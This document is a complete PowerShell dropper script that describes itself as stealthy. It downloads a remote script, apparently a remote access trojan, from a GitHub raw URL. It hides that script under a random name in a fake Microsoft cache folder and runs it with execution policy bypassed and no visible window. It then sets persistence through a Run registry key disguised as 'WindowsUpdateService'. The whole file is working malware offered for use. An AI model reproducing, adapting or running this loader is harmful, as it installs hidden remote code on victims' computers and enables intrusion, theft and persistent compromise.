# QuantumDownloaderInstaller.ps1
# Stealthy PowerShell script to download, install, and execute a file with startup persistence

# Function to generate a random string for filenames
function Get-RandomName {
    param ([int]$length)
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".ToCharArray()
    $random = New-Object System.Random
    $result = -join (1..$length | ForEach-Object { $chars[$random.Next(0, $chars.Length)] })
    return $result
}

# Function to log errors to a hidden file
function Write-ErrorLog {
    param (
        [string]$Message,
        [string]$LogDir
    )
    try {
        if (-not (Test-Path $LogDir)) {
            New-Item -ItemType Directory -Path $LogDir -Force | Out-Null
            (Get-Item $LogDir).Attributes = 'Hidden,System'
        }
        $logPath = Join-Path $LogDir "log.txt"
        $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Add-Content -Path $logPath -Value "$timestamp : $Message"
        (Get-Item $logPath).Attributes = 'Hidden,System'
    } catch {
        # Silent error handling
    }
}

try {
    # Step 1: Define configuration
    $url = "https://raw.githubusercontent.com/divinelol/rceingskiuds/main/ratpuilt9476e8db5df043b7848a0f9e95b2cf1a.ps1" # Provided URL
    $installDir = Join-Path $env:APPDATA "Microsoft\Windows\Cache"
    $randomFileName = (Get-RandomName -length 8) + ".ps1"
    $installPath = Join-Path $installDir $randomFileName
    $appName = "WindowsUpdateService"

    # Step 2: Download the file silently
    $client = New-Object System.Net.WebClient
    $client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    try {
        $fileBytes = $client.DownloadData($url)
        if (-not $fileBytes -or $fileBytes.Length -eq 0) {
            Write-ErrorLog -Message "Failed to download file from URL." -LogDir $installDir
            exit
        }
    } catch {
        Write-ErrorLog -Message "Download error: $_" -LogDir $installDir
        exit
    }

    # Step 3: Create installation directory
    if (-not (Test-Path $installDir)) {
        New-Item -ItemType Directory -Path $installDir -Force | Out-Null
        (Get-Item $installDir).Attributes = 'Hidden,System'
    }

    # Step 4: Save the file
    [System.IO.File]::WriteAllBytes($installPath, $fileBytes)
    (Get-Item $installPath).Attributes = 'Hidden,System'

    # Step 5: Add randomized delay for stealth
    Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 3000)

    # Step 6: Run the script immediately
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "powershell.exe"
        $psi.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$installPath`""
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $process = [System.Diagnostics.Process]::Start($psi)
        $errorOutput = $process.StandardError.ReadToEnd()
        $process.WaitForExit()
        if ($errorOutput) {
            Write-ErrorLog -Message "Execution error: $errorOutput" -LogDir $installDir
        }
    } catch {
        Write-ErrorLog -Message "Execution error: $_" -LogDir $installDir
    }

    # Step 7: Add to Windows startup via Registry
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $command = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$installPath`""
        Set-ItemProperty -Path $regPath -Name $appName -Value $command -ErrorAction Stop
    } catch {
        Write-ErrorLog -Message "Registry error: $_" -LogDir $installDir
        exit
    }
} catch {
    Write-ErrorLog -Message "General error: $_" -LogDir (Join-Path $env:APPDATA "Microsoft\Windows\Cache")
}